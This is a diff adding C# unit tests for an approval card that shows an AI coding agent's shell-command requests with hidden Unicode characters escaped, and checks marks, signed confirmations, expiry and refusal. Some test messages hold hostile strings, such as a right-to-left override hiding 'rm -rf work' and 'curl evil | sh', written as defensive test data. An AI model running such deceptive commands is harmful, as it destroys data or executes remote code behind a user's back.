@@ -228,6 +228,345 @@ public sealed class CardTests : IAsyncLifetime
         Assert.False(ShownText.HasHidden(q.Message) || ShownText.HasRightToLeft(q.Message));
     }
 
+    // ---- an approval the host escaped anything in (#803) ----
+
+    static Question Escaped(string approve = EscapedApproval.Confirm)
+    {
+        const string message = "Allow **shell**?\n\n```\necho \\u202E safe\n```";
+        return Make.Approval() with { Message = message, Escaped = EscapedApproval.For(message, [(27, 6)], approve) };
+    }
+
+    QuestionViewModel EscapedQuestion(Question q, bool offered, List<(string Session, string Question, string Shown, string Request)>? signed = null) =>
+        new(q, "s1", AgentKind.Copilot, offered ? [.. connection.Capabilities, Capabilities.SessionsApprove, EscapedApproval.Capability] : [.. connection.Capabilities, Capabilities.SessionsApprove], deliveries, "Test PC")
+        {
+            SignEscaped = (session, question, shown, request, _) =>
+            {
+                signed?.Add((session, question, shown, request));
+                return new SignedCommand { Body = "Ym9keQ", By = "Ynk", Mac = "bWFj" };
+            },
+        };
+
+    [Fact]
+    public void A_mark_covering_more_than_one_escape_never_offers_the_confirmation_and_every_character_is_drawn()
+    {
+        // The mark covers "\u202E; rm -rf work": drawn as tokens alone, the sheet showed "\u202E"
+        // while the confirmation hashed the whole message (#836 review).
+        const string message = "Allow **shell**?\n\n```\necho \\u202E; rm -rf work\n```";
+        IReadOnlyList<IReadOnlyList<int>> marks = [[27, 19]];
+        var q = EscapedQuestion(Make.Approval() with { Message = message, Escaped = new EscapedText { Shown = EscapedApproval.Shown(message), Marks = marks, Approve = EscapedApproval.Confirm } }, offered: true);
+
+        Assert.Equal("machine", q.EscapedMode);
+        Assert.NotNull(q.ConfirmEscaped());
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+        var drawn = string.Concat(EscapedApprovalView.Segments(message, marks).SelectMany(p => p.Mark ? EscapedApprovalView.Pieces(p.Text).Select(x => x.Text) : [p.Text]));
+        Assert.Equal(message, drawn);
+        Assert.Equal(["\\u202E", "; rm -rf work"], EscapedApprovalView.Pieces(message.Substring(27, 19)).Select(p => p.Text));
+    }
+
+    [Theory]
+    // A third number, a null or text in a mark, as a host may send one: [5, null, 6] read past as
+    // [5, 6], a mark the host never sent, offered the confirmation (#836 review).
+    [InlineData("[[5, 6, 7]]")]
+    [InlineData("[[5, null, 6]]")]
+    [InlineData("[[5, \"6\"]]")]
+    public void A_mark_that_is_not_exactly_two_whole_numbers_as_sent_never_offers_the_confirmation(string marks)
+    {
+        const string message = "echo \\u202E done";
+        var whole = Make.Approval() with { Message = message, Escaped = new EscapedText { Shown = EscapedApproval.Shown(message), Marks = [[5, 6]], Approve = EscapedApproval.Confirm } };
+        Assert.Equal("confirm", EscapedQuestion(whole, offered: true).EscapedMode);
+        var sent = JsonSerializer.SerializeToNode(whole, ProtocolJson.Options)!;
+        sent["escaped"]!["marks"] = System.Text.Json.Nodes.JsonNode.Parse(marks);
+
+        Question? read;
+        try { read = Received.Read<Question>(JsonSerializer.SerializeToElement(sent)); }
+        catch (MalformedRecordException) { read = null; }
+
+        // Refused (the session is shown without it, Malformed records rule 4), or read and held.
+        if (read is not null) { Assert.Equal("machine", EscapedQuestion(read, offered: true).EscapedMode); }
+        Assert.True(read is null || marks == "[[5, 6, 7]]", $"read as {JsonSerializer.Serialize(read?.Escaped?.Marks)}");
+    }
+
+    [Theory]
+    [InlineData(int.MaxValue, 6)]
+    [InlineData(5, int.MaxValue)]
+    [InlineData(int.MaxValue, int.MaxValue)]
+    public void A_mark_whose_end_overflows_is_held_at_the_machine_and_the_message_is_still_drawn_whole(int start, int length)
+    {
+        const string message = "echo \\u202E done";
+        IReadOnlyList<IReadOnlyList<int>> marks = [[start, length]];
+        var q = EscapedQuestion(Make.Approval() with { Message = message, Escaped = new EscapedText { Shown = EscapedApproval.Shown(message), Marks = marks, Approve = EscapedApproval.Confirm } }, offered: true);
+
+        Assert.Equal("machine", q.EscapedMode);
+        Assert.False(EscapedApprovalView.MarksExact(message, marks));
+        Assert.Equal(message, string.Concat(EscapedApprovalView.Segments(message, marks).Select(p => p.Text)));
+    }
+
+    [Fact]
+    public void Escaped_text_arriving_for_a_question_already_shown_rebuilds_its_controls()
+    {
+        // A host updated to escape: the same id, the same message, escaped now. Kept, the card would
+        // still offer the one-tap Approve once (#836 review).
+        var caps = new List<string>([.. connection.Capabilities, Capabilities.SessionsApprove]);
+        var plain = Escaped() with { Escaped = null };
+        var card = new SessionCardViewModel(Make.Session(question: plain), Context(caps: () => caps));
+        Assert.Null(card.Question!.EscapedMode);
+
+        card.Update(Make.Session(question: Escaped()));
+        Assert.Equal("device", card.Question!.EscapedMode);
+        card.Update(Make.Session(question: Escaped(EscapedApproval.Machine)));
+        Assert.Equal("machine", card.Question!.EscapedMode);
+    }
+
+    [Fact]
+    public async Task Try_again_after_a_rebuild_for_new_capabilities_resends_an_escaped_approval_with_its_confirmation()
+    {
+        host.On(Ops.SessionAnswer, _ => throw new InvalidOperationException("the host failed after reading it"));
+        var caps = new List<string>([.. connection.Capabilities, Capabilities.SessionsApprove, EscapedApproval.Capability]);
+        var signs = 0;
+        var ctx = new CardContext
+        {
+            Deliveries = deliveries, Folds = new FoldStore(folds), Capabilities = () => caps, MachineName = () => "Test PC", Host = connection, Time = clock,
+            SignEscaped = (_, _, _, _, _) => { signs++; return new SignedCommand { Body = "Ym9keQ", By = "Ynk", Mac = "bWFj" }; },
+        };
+        var card = new SessionCardViewModel(Make.Session(question: Escaped()), ctx);
+        Assert.Null(card.Question!.ConfirmEscaped());
+        await Wait.UntilAsync(() => card.Question!.ShowResend, "the failure");
+
+        caps.Add(Capabilities.SessionsReply + ".x");
+        card.Update(Make.Session(question: Escaped()));
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        card.Question!.Resend();
+
+        await Wait.UntilAsync(() => host.Sent(Ops.SessionAnswer).Count == 2, "the resend");
+        var resent = host.Sent(Ops.SessionAnswer)[1];
+        Assert.Equal("bWFj", resent.GetProperty("confirm").GetProperty("mac").GetString());
+        Assert.Equal(host.Sent(Ops.SessionAnswer)[0].GetProperty("request").GetString(), resent.GetProperty("request").GetString());
+        Assert.Equal(1, signs);
+    }
+
+    [Fact]
+    public async Task Approve_once_on_an_escaped_approval_opens_the_sheet_and_only_its_button_sends_signed_for_that_answer()
+    {
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        var signed = new List<(string Session, string Question, string Shown, string Request)>();
+        var q = EscapedQuestion(Escaped(), offered: true, signed);
+        var opened = 0;
+        q.EscapedConfirmRequested += () => opened++;
+
+        Assert.Equal("confirm", q.EscapedMode);
+        q.Choose(q.Fields[0].Options.Single(o => o.Value == "approve"));
+        Assert.Equal(1, opened);
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => q.StatusText == "You answered · \u2068Approve once\u2069", "delivered");
+        var sent = Assert.Single(host.Sent(Ops.SessionAnswer));
+        Assert.Equal("approve", sent.GetProperty("fields").GetProperty("decision").GetString());
+        Assert.Equal("bWFj", sent.GetProperty("confirm").GetProperty("mac").GetString());
+        var (session, question, shown, request) = Assert.Single(signed);
+        Assert.Equal(("s1", q.Id, Escaped().Escaped!.Shown, sent.GetProperty("request").GetString()), (session, question, shown, request));
+    }
+
+    [Fact]
+    public async Task A_confirmation_pressed_as_its_machine_goes_says_it_was_not_sent_and_goes_when_pressed_again()
+    {
+        // The machine gone between the card's check and the submit (#269's hold): nothing is kept,
+        // so the sheet must not close as if Approve went (#836 review 5780082443).
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        var signed = new List<(string Session, string Question, string Shown, string Request)>();
+        var q = EscapedQuestion(Escaped(), offered: true, signed);
+        deliveries.Hold = _ => "Test PC is not connected now";
+
+        Assert.Equal("Not sent: Test PC is not connected now. Press again once it's back.", q.ConfirmEscaped());
+        Assert.Null(deliveries.Get(q.Key));
+        Assert.Empty(signed);
+        Assert.False(q.Fields[0].Options.Single(o => o.Value == "approve").IsSelected);
+
+        deliveries.Hold = null;
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => q.StatusText == "You answered · \u2068Approve once\u2069", "delivered");
+        Assert.Equal("bWFj", Assert.Single(host.Sent(Ops.SessionAnswer)).GetProperty("confirm").GetProperty("mac").GetString());
+        Assert.Single(signed);
+    }
+
+    [Fact]
+    public async Task A_confirmation_that_could_not_be_signed_while_the_link_was_down_is_signed_when_it_is_back_never_sent_without()
+    {
+        // The machine's key unknown as the first attempt is made (its relay link down): kept, that
+        // null went with every resend of the request and the host refused the Approve (#836 review
+        // 5780340459).
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        var requests = new List<string>();
+        var q = new QuestionViewModel(Escaped(), "s1", AgentKind.Copilot, [.. connection.Capabilities, Capabilities.SessionsApprove, EscapedApproval.Capability], deliveries, "Test PC")
+        {
+            SignEscaped = (_, _, _, request, _) =>
+            {
+                requests.Add(request);
+                return requests.Count == 1 ? null : new SignedCommand { Body = "Ym9keQ", By = "Ynk", Mac = "bWFj" };
+            },
+        };
+
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => q.StatusText == "You answered · \u2068Approve once\u2069", "delivered");
+
+        var sent = Assert.Single(host.Sent(Ops.SessionAnswer));
+        Assert.Equal("bWFj", sent.GetProperty("confirm").GetProperty("mac").GetString());
+        Assert.Equal(2, requests.Count);
+        Assert.Equal(sent.GetProperty("request").GetString(), Assert.Single(requests.Distinct()));
+    }
+
+    [Fact]
+    public async Task A_confirmation_whose_key_comes_back_within_its_lifetime_is_signed_as_of_the_press_not_of_the_return()
+    {
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        var key = false;
+        var pressedAt = new List<DateTimeOffset>();
+        var q = new QuestionViewModel(Escaped(), "s1", AgentKind.Copilot, [.. connection.Capabilities, Capabilities.SessionsApprove, EscapedApproval.Capability], deliveries, "Test PC")
+        {
+            SignEscaped = (_, _, _, _, pressed) =>
+            {
+                pressedAt.Add(pressed);
+                return key ? new SignedCommand { Body = "Ym9keQ", By = "Ynk", Mac = "bWFj" } : null;
+            },
+        };
+
+        var press = clock.GetUtcNow();
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => pressedAt.Count > 0, "a first attempt, with no key");
+        clock.Advance(TimeSpan.FromMinutes(2));
+        key = true;
+
+        await Wait.UntilAsync(() => q.StatusText == "You answered · \u2068Approve once\u2069", "delivered");
+        Assert.Single(host.Sent(Ops.SessionAnswer));
+        Assert.Equal(press, pressedAt[^1]);
+    }
+
+    [Fact]
+    public async Task A_confirmation_is_signed_as_of_its_press_and_one_whose_key_came_after_its_lifetime_is_never_sent_but_asked_for_again()
+    {
+        // Signed when the link came back, an Approve pressed nine minutes before landed with a fresh
+        // five-minute confirmation (Trust's review of 07388e7e).
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        var key = false;
+        var pressedAt = new List<DateTimeOffset>();
+        var q = new QuestionViewModel(Escaped(), "s1", AgentKind.Copilot, [.. connection.Capabilities, Capabilities.SessionsApprove, EscapedApproval.Capability], deliveries, "Test PC")
+        {
+            SignEscaped = (_, _, _, _, pressed) =>
+            {
+                pressedAt.Add(pressed);
+                return key ? new SignedCommand { Body = "Ym9keQ", By = "Ynk", Mac = "bWFj" } : null;
+            },
+        };
+
+        var first = clock.GetUtcNow();
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => pressedAt.Count > 0, "a first attempt, with no key");
+        clock.Advance(EscapedApproval.MaxLifetime + TimeSpan.FromSeconds(1));
+        key = true;
+
+        await Wait.UntilAsync(() => q.CanAnswer, "the press asked for again");
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+        Assert.Contains("expired", q.StatusText);
+        Assert.False(q.ShowResend);
+        Assert.All(pressedAt, p => Assert.Equal(first, p));
+
+        var second = clock.GetUtcNow();
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => q.StatusText == "You answered · \u2068Approve once\u2069", "delivered");
+        Assert.Single(host.Sent(Ops.SessionAnswer));
+        Assert.Equal(second, pressedAt[^1]);
+    }
+
+    [Fact]
+    public async Task A_confirmation_waiting_for_a_machine_gone_past_its_lifetime_ends_expired_and_unsent_and_asks_for_the_press_again()
+    {
+        // Waited out to the give-up with the machine away, it ended unconfirmed before its data was
+        // read again: neither Approve once… nor Try again was offered, though nothing had gone (#850,
+        // Copilot review of df30fc71).
+        await Wait.UntilAsync(() => connection.State == LinkState.Connected, "connected");
+        var q = EscapedQuestion(Escaped(), offered: true);
+        await host.StopAsync();
+        await Wait.UntilAsync(() => connection.State != LinkState.Connected, "the machine gone");
+
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => deliveries.Get(q.Key)?.State == DeliveryState.Waiting, "waiting for the machine");
+        clock.Advance(deliveries.GiveUp + TimeSpan.FromSeconds(1));
+
+        await Wait.UntilAsync(() => q.CanAnswer, "the press asked for again");
+        Assert.Contains("expired", q.StatusText);
+        Assert.False(q.ShowResend);
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+    }
+
+    [Fact]
+    public async Task A_confirmation_written_before_the_hosts_process_was_known_is_never_called_expired_however_long_the_machine_is_then_gone()
+    {
+        // Written in the moment after a reconnect before the host's process is known, it left
+        // FirstSent unset, so a link lost past its lifetime made it "expired" with Approve once…
+        // offered again, though the host may have approved it (Trust's review of 7bd29fcf).
+        host.OnAsync(Ops.SessionAnswer, async _ => { await FakeHost.Until(new TaskCompletionSource().Task); return null; });
+        var known = new TaskCompletionSource();
+        host.OnAsync(HostOps.Subscribe, async _ => { await FakeHost.Until(known.Task); return host.Status; });
+        var q = EscapedQuestion(Escaped(), offered: true);
+        var subscribed = host.Sent(HostOps.Subscribe).Count;
+        await host.StopAsync();
+        host.Start();
+        await Wait.UntilAsync(() => host.Sent(HostOps.Subscribe).Count > subscribed, "reconnected, the host's process not yet known");
+
+        Assert.Null(q.ConfirmEscaped());
+        await Wait.UntilAsync(() => host.Sent(Ops.SessionAnswer).Count == 1, "the Approve written");
+        Assert.Null(deliveries.Get(q.Key)!.FirstSent);
+        await host.StopAsync();
+        await Wait.UntilAsync(() => deliveries.Get(q.Key)?.State == DeliveryState.Waiting, "waiting for the machine");
+        clock.Advance(deliveries.GiveUp + TimeSpan.FromSeconds(1));
+
+        await Wait.UntilAsync(() => deliveries.Get(q.Key)?.State == DeliveryState.Done, "given up");
+        Assert.Equal("unconfirmed", deliveries.Get(q.Key)!.Outcome);
+        Assert.False(q.CanAnswer);
+        known.TrySetResult();
+    }
+
+    [Fact]
+    public void Without_the_capability_or_with_the_machine_holding_it_an_escaped_approval_offers_Deny_and_says_why()
+    {
+        var device = EscapedQuestion(Escaped(), offered: false);
+        Assert.Equal("device", device.EscapedMode);
+        Assert.Equal("Approve this at Test PC, or from a device approved there.", device.EscapedWhy);
+        var machine = EscapedQuestion(Escaped(EscapedApproval.Machine), offered: true);
+        Assert.Equal("Test PC takes this approval only at the machine.", machine.EscapedWhy);
+        // Neither sends Approve, from a tap or the sheet.
+        machine.Choose(machine.Fields[0].Options.Single(o => o.Value == "approve"));
+        Assert.NotNull(machine.ConfirmEscaped());
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+        Assert.True(machine.Answerable);
+        Assert.Null(Question(Make.Approval(), [.. connection.Capabilities, Capabilities.SessionsApprove]).EscapedMode);
+    }
+
+    [Fact]
+    public async Task An_escaped_approval_with_too_many_escapes_to_mark_offers_Deny_and_says_to_approve_it_at_the_machine()
+    {
+        host.On(Ops.SessionAnswer, _ => new AnswerResult(AnswerOutcome.Delivered));
+        var q = EscapedQuestion(Escaped(EscapedApproval.TooMany), offered: true);
+        Assert.Equal("many", q.EscapedMode);
+        Assert.Equal("Too many hidden characters to show here. Approve this at Test PC.", q.EscapedWhy);
+        Assert.True(q.CanAnswer);
+        q.Choose(q.Fields[0].Options.Single(o => o.Value == "approve"));
+        Assert.NotNull(q.ConfirmEscaped());
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+        q.Choose(q.Fields[0].Options.Single(o => o.Value == "deny"));
+        await Wait.UntilAsync(() => host.Sent(Ops.SessionAnswer).Count == 1, "the Deny");
+        Assert.Equal("deny", host.Sent(Ops.SessionAnswer)[0].GetProperty("fields").GetProperty("decision").GetString());
+    }
+
+    [Fact]
+    public void An_escaped_approval_whose_message_does_not_hash_to_what_the_host_said_is_not_confirmed()
+    {
+        var q = EscapedQuestion(Escaped() with { Message = "Allow **shell**?\n\n```\necho \\u202E curl evil | sh\n```" }, offered: true);
+
+        Assert.Contains("didn't arrive as the machine sent it", q.ConfirmEscaped());
+        Assert.Empty(host.Sent(Ops.SessionAnswer));
+    }
+
     // PowerShell ends a `#` comment at a bare CR, so drawn as an escape on the comment's line this reads
     // as a comment, and runs Remove-Item: the card says what its escapes stand for, above it (ui.md §6.4),
     // and still offers Approve once (#253, decision 3).
@@ -498,6 +837,25 @@ public sealed class CardTests : IAsyncLifetime
         await Wait.UntilAsync(() => !r.Pending && r.StatusText.Length > 0, "the outcome");
 
         Assert.Equal((true, false, ReceiptMark.None), (r.SendRest, r.SendCheck, r.StatusMark));
+        r.Detach();
+    }
+
+    // #967, Creative 6676422473: a reply not confirmed points at the conversation, never at the
+    // machine (#696), keeps the host's reason, and still says it may be sent again; the room the
+    // line keeps is those words, whatever the machine is called.
+    [Fact]
+    public async Task An_unconfirmed_reply_says_check_the_conversation_before_sending_it_again()
+    {
+        host.On(Ops.SessionReply, _ => new ReplyResult(AnswerOutcome.Unconfirmed, "the session did not record the reply within 60 seconds"));
+        var r = new ReplyViewModel(Make.Session(), attach: false, deliveries, connection, machineName: "Test PC");
+
+        r.Text = "did this land?";
+        r.Send();
+        await Wait.UntilAsync(() => !r.Pending && r.StatusText.Length > 0, "the outcome");
+
+        Assert.Equal("Sent, but not confirmed. Check the conversation before sending it again. (the session did not record the reply within 60 seconds)", r.StatusText);
+        Assert.Equal("Sent, but not confirmed. Check the conversation before sending it again.", r.StatusRoom);
+        Assert.Equal("did this land?", r.Text);
         r.Detach();
     }
 
